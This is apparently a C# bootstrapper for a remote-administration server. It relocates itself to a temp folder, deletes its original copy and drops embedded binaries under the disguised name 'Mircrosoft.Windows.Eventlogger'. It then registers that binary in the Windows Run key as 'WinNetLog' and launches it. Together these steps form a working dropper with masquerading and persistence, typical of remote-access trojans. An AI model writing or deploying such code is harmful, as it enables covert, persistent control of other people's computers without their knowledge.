using System;
using System.Collections;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.ServiceProcess;
using System.Text;
using Microsoft.Win32;

namespace JPB.RemoteAdmin.Server.Service.Bootstrapper
{
    class Program
    {
        static void Main(string[] args)
        {

            var netInstall = "/q /norestart";
            //var nameOfnet = "dotNetFx45_Full_setup.exe";
            //File.WriteAllBytes(nameOfnet, Resource1.dotNetFx45_Full_setup);
            //var install = Process.Start(nameOfnet, netInstall);
            const string foundExe = "Mircrosoft.Windows.Eventlogger";

            var processesByName = Process.GetProcessesByName(foundExe + ".exe");
            foreach (var process in processesByName)
            {
                process.Kill();
            }

            try
            {
                var path = Path.GetTempPath();
                var isInTemp = Assembly.GetExecutingAssembly().Location.StartsWith(path);
#if !DEBUG
                if (!isInTemp)
                {
                    MoveAndCall();
                    return;
                }
                else
                {
                    if (args.Length > 0)
                    {
                        var calle = args[0];
                        File.Delete(calle);
                    }
                }
#endif

                ResourceSet resourceSet = Resource2.ResourceManager.GetResourceSet(CultureInfo.InvariantCulture, true, true);
                foreach (DictionaryEntry entry in resourceSet)
                {
                    string resourceKey = ((string)entry.Key).Replace("_", ".");
                    object resource = entry.Value;

                    if (resourceKey == foundExe)
                    {
                        resourceKey = resourceKey + ".exe";
                    }
                    else
                    {
                        resourceKey = resourceKey + ".dll";
                    }

                    File.WriteAllBytes(resourceKey, (byte[])resource);
                }

                //install.WaitForExit();
                InstallAsBackgroundWorker(foundExe + ".exe");
                Process.Start(foundExe + ".exe");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return;
            }
        }

        [ComImport]
        [Guid("00021401-0000-0000-C000-000000000046")]
        internal class ShellLink
        {
        }

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("000214F9-0000-0000-C000-000000000046")]
        internal interface IShellLink
        {
            void GetPath([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszFile, int cchMaxPath, out IntPtr pfd, int fFlags);
            void GetIDList(out IntPtr ppidl);
            void SetIDList(IntPtr pidl);
            void GetDescription([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszName, int cchMaxName);
            void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string pszName);
            void GetWorkingDirectory([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszDir, int cchMaxPath);
            void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string pszDir);
            void GetArguments([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszArgs, int cchMaxPath);
            void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string pszArgs);
            void GetHotkey(out short pwHotkey);
            void SetHotkey(short wHotkey);
            void GetShowCmd(out int piShowCmd);
            void SetShowCmd(int iShowCmd);
            void GetIconLocation([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszIconPath, int cchIconPath, out int piIcon);
            void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string pszIconPath, int iIcon);
            void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string pszPathRel, int dwReserved);
            void Resolve(IntPtr hwnd, int fFlags);
            void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);
        }

        public static void InstallAsBackgroundWorker(string exe)
        {
            var location = Assembly.GetExecutingAssembly().Location;
            if (location != null)
            {
                var dir = Path.GetDirectoryName(location);
                var path = Path.Combine(dir, exe);


                // The path to the key where Windows looks for startup applications
                var rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                if (rkApp != null)
                    rkApp.SetValue("WinNetLog", path);
            }


            //var link = (IShellLink)new ShellLink();

            //// setup shortcut information
            //link.SetDescription("Test");
            //link.SetPath(path);

            //// save it
            //IPersistFile file = (IPersistFile)link;
            //string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.);
            //file.Save(Path.Combine(desktopPath, "MyLink.lnk"), false);
        }

        //private void InstallAsService()
        //{
        //    try
        //    {
        //        string[] commandLineOptions = new string[1] { "/LogFile=install.log" };

        //        System.Configuration.Install.AssemblyInstaller installer = new System.Configuration.Install.AssemblyInstaller(foundExe, commandLineOptions);

        //        installer.UseNewContext = true;
        //        installer.Install(null);
        //        installer.Commit(null);
        //    }
        //    catch (Exception)
        //    {
        //        ManagedInstallerClass.InstallHelper(new string[] { foundExe });
        //    }

        //    using (var sc = new ServiceController("WinLog"))
        //    {
        //        sc.Start();
        //        sc.WaitForStatus(ServiceControllerStatus.Running);
        //    }   
        //}

        public static void MoveAndCall()
        {
            var tempFolder = Path.GetTempFileName();

            File.Delete(tempFolder);
            var info = Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), tempFolder));
            var currentloc = Assembly.GetCallingAssembly().Location;
            var newLoc = Path.Combine(info.FullName, Path.GetFileName(Assembly.GetCallingAssembly().Location));
            File.Copy(currentloc, newLoc);
            Process.Start(new ProcessStartInfo(newLoc)
            {
                WorkingDirectory = Path.GetTempPath(),
                Arguments = currentloc
            });
        }
    }
}
